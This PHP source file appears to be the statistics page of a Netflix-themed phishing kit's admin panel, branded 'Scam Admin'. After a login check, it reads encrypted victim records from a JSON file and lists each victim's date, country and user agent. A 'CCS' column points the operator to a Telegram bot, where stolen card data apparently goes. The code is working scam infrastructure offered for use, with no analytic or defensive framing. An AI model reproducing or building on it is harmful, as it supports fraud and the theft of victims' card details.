<?php
error_reporting(0);
include("../../encriptador.php");

session_start();
if (isset($_SESSION['logueado']) and $_SESSION['logueado']) {
    $nombre = $_SESSION['nombre'];
} else {
    //Si el usuario no está logueado redireccionamos al login.
    header('Location: login.php');
    exit;
}

$datos = file_get_contents("../db.json");

$json = json_decode($datos, true);

?>
<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Netflix</title>
    <link rel="shortcut icon" href="../../img/icon.ico" type="image/x-icon">
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
    <link rel="stylesheet" href="../css/index.css">
    <title>Hello, world!</title>

</head>
<body>
    <div class="animate__animated animate__fadeInLeft">
        <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <div class="container">
                <a class="navbar-brand" href="../index.php">Scam Admin</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                        <li class="nav-item">
                            <a class="nav-link " aria-current="page" href="../index.php">Home</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link active" href="pages/stats.php">Stats</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="../Valid-1/index.php">Ir Al Index del Scam</a>
                        </li>
                    </ul>
                    <ul class="navbar-nav me-0 mb-2 mb-lg-0 ">
                        <li class="nav-item">
                            <a class="nav-link" href="#" tabindex="-1" aria-disabled="true"><img src="../img/sayhitogabe.jpg" alt="" class="img-user"><span class="hidden-xs">@SelsiusRC28</span></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link btn btn-primary text-white " href="../cerrar_sesion.php" tabindex="-1" aria-disabled="true">Cerrar Sesion</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        
        <div class="container mt-3">
            <table class="table table-success table-striped rounded-3">
                <thead>
                    <tr>
                         <th scope="col">FECHA</th>
                        <th scope="col">#</th>
                        <th scope="col">Pais</th>
                        <th scope="col">User Agent</th>
                        <th scope="col">CCS</th>
                    </tr>
                </thead>
                <tbody>
                        <?php
                        $i = 0;
                        foreach ($json as $item) {
                        ?>
                        <tr>
                            <th scope="row"><?php echo SED::decryption($item["fecha"])?></th>
                            <th scope="row"><?php echo ++$i?></th>
                            <td scope="row"><?php echo SED::decryption($item["pais"])?></td>
                            <td scope="row"><?php echo SED::decryption($item["user"])?></td>
                            <td><button class="btn btn-primary">Revisa tu Bot de Telegram</button></td>
                        </tr>
                        <?php
                        }
                        ?>
                </tbody>
            </table>
        </div>
    </div>
</body>
<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.min.js" integrity="sha384-Atwg2Pkwv9vp0ygtn1JAojH0nYbwNJLPhwyoVbhoPwBhjQPR5VtM2+xf0Uwh9KtT" crossorigin="anonymous"></script>

</html>

